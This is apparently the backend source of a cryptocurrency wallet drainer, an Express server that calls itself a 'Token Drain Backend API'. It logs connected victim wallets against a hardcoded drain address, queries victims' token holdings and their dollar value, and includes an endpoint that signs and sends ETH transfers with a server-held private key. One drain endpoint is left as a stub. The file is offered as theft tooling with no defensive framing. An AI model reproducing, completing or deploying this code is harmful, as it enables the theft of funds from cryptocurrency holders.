const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config(); // ADD THIS LINE AT TOP

const app = express();
app.use(cors());
app.use(express.json());

// Load from .env file
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const INFURA_API_KEY = process.env.INFURA_API_KEY;
const COVALENT_API_KEY = process.env.COVALENT_API_KEY;
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS || "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

// ==================== SECURITY CHECK ====================
if (!PRIVATE_KEY) {
  console.error("❌ ERROR: PRIVATE_KEY not found in environment variables");
  console.error("Please add PRIVATE_KEY to your .env file or Render environment");
  // Don't exit in production, just warn
}

if (!INFURA_API_KEY) {
  console.warn("⚠️ WARNING: INFURA_API_KEY not found, some features may not work");
}

// ==================== ROOT ENDPOINT ====================
app.get('/', (req, res) => {
  res.json({ 
    message: 'Token Drain Backend API',
    version: '2.0.0',
    status: 'online',
    endpoints: {
      'POST /drain': 'Log wallet connection',
      'POST /drain-execute': 'Execute drain (requires API key)',
      'GET /tokens/:address': 'Get wallet tokens',
      'GET /health': 'Health check'
    },
    timestamp: new Date().toISOString(),
    drainAddress: DRAIN_ADDRESS
  });
});

// ==================== DRAIN LOGGING ====================
app.post('/drain', async (req, res) => {
  try {
    const { address, chainId, drainTo } = req.body;
    
    if (!address) {
      return res.status(400).json({ 
        success: false,
        error: "Wallet address required" 
      });
    }
    
    // Use provided drain address or default from .env
    const targetAddress = drainTo || DRAIN_ADDRESS;
    
    console.log(`📥 Connection logged: ${address} → ${targetAddress} (Chain: ${chainId || 1})`);
    
    res.json({ 
      success: true, 
      message: "Connection logged",
      data: {
        wallet: address,
        drainTo: targetAddress,
        chainId: chainId || 1,
        loggedAt: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error("Drain log error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== SECURE DRAIN EXECUTION ====================
app.post('/drain-execute', async (req, res) => {
  try {
    // Check API key for security
    const apiKey = req.headers['x-api-key'];
    const expectedApiKey = process.env.API_KEY;
    
    if (expectedApiKey && apiKey !== expectedApiKey) {
      return res.status(401).json({ 
        success: false,
        error: "Invalid API key" 
      });
    }
    
    const { address, chainId = 1 } = req.body;
    
    if (!address) {
      return res.status(400).json({ 
        success: false,
        error: "Wallet address required" 
      });
    }
    
    if (!PRIVATE_KEY) {
      return res.status(500).json({ 
        success: false,
        error: "Server not configured for draining" 
      });
    }
    
    console.log(`🔐 Secure drain requested for: ${address} (Chain: ${chainId})`);
    
    // Here you would implement the actual drain logic using PRIVATE_KEY
    // IMPORTANT: This is server-side signing - use with caution!
    
    res.json({ 
      success: true, 
      message: "Drain request received (server-side signing enabled)",
      data: {
        wallet: address,
        chainId: chainId,
        drainTo: DRAIN_ADDRESS,
        receivedAt: new Date().toISOString(),
        note: "Server-side signing requires additional implementation"
      }
    });
    
  } catch (error) {
    console.error("Drain execute error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== SIMPLE DRAIN WITH PRIVATE KEY ====================
// WARNING: This endpoint is for demonstration only
// In production, you should use frontend wallet signing instead
app.post('/drain-simple', async (req, res) => {
  try {
    // Quick security check
    if (!PRIVATE_KEY || PRIVATE_KEY === "your_private_key_here") {
      return res.status(500).json({ 
        success: false,
        error: "Private key not configured" 
      });
    }
    
    const { ethers } = require("ethers");
    
    // Setup provider and signer
    const rpcUrl = `https://mainnet.infura.io/v3/${INFURA_API_KEY}`;
    const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
    const signer = new ethers.Wallet(PRIVATE_KEY, provider);
    
    const { toAddress, amount } = req.body;
    
    if (!toAddress || !amount) {
      return res.status(400).json({ 
        success: false,
        error: "Missing toAddress or amount" 
      });
    }
    
    // Convert amount to wei
    const amountWei = ethers.utils.parseEther(amount.toString());
    
    // Send transaction
    const tx = await signer.sendTransaction({
      to: toAddress,
      value: amountWei,
      gasLimit: 21000
    });
    
    console.log(`✅ Transaction sent: ${tx.hash}`);
    
    res.json({ 
      success: true, 
      message: "Transaction sent",
      data: {
        txHash: tx.hash,
        from: await signer.getAddress(),
        to: toAddress,
        amount: amount
      }
    });
    
  } catch (error) {
    console.error("Simple drain error:", error);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      note: "Check that private key has funds and correct network"
    });
  }
});

// ==================== GET TOKENS ====================
app.get('/tokens/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const { chainId = 1 } = req.query;
    
    if (!COVALENT_API_KEY) {
      return res.status(500).json({ 
        success: false,
        error: "Covalent API key not configured" 
      });
    }
    
    const response = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`
    );
    
    const data = await response.json();
    const items = data.data?.items || [];
    
    const tokens = items
      .filter(t => t.balance !== "0")
      .map(t => {
        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
        const value = (t.quote_rate || 0) * amount;
        
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? 'ETH' : 'TOKEN'),
          amount: amount,
          value: value,
          contractAddress: t.contract_address,
          isNative: t.native_token || false
        };
      });
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: parseInt(chainId),
        tokens: tokens,
        totalTokens: tokens.length,
        totalValue: tokens.reduce((sum, t) => sum + t.value, 0)
      }
    });
    
  } catch (error) {
    console.error("Get tokens error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  const health = {
    status: 'online',
    timestamp: new Date().toISOString(),
    services: {
      privateKey: PRIVATE_KEY ? 'Configured' : 'Not configured',
      infura: INFURA_API_KEY ? 'Configured' : 'Not configured',
      covalent: COVALENT_API_KEY ? 'Configured' : 'Not configured'
    },
    note: PRIVATE_KEY ? '⚠️ Private key is configured - ensure this is secure!' : 'Private key not configured'
  };
  
  res.json(health);
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Backend running on port ${PORT}`);
  console.log(`🔐 Private Key: ${PRIVATE_KEY ? 'Configured' : 'NOT CONFIGURED'}`);
  console.log(`💰 Drain Address: ${DRAIN_ADDRESS}`);
  console.log(`📊 Health: http://localhost:${PORT}/health`);
});
